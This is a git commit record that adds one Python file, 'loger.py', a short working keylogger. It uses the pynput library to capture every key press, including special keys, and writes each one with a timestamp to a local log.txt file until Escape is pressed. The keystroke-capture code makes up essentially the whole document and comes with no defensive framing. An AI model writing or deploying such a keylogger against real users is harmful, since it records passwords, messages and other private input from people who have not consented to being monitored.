06e5fbdf13def139bf952edd79a9542d8aafea31
naveen kumar <157386680+naveenkumarkannan2004@users.noreply.github.com>
2024-07-23 20:54:11 +0530

    Add files via upload

---
+++ loger.py
@@ -0,0 +1,18 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+def on_press(key):
+    try:
+        logging.info(f"Key pressed: {key.char}")
+    except AttributeError:
+        logging.info(f"Special key pressed: {key}")
+
+def on_release(key):
+    if key == Key.esc:
+        # Stop listener
+        return False
+    
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
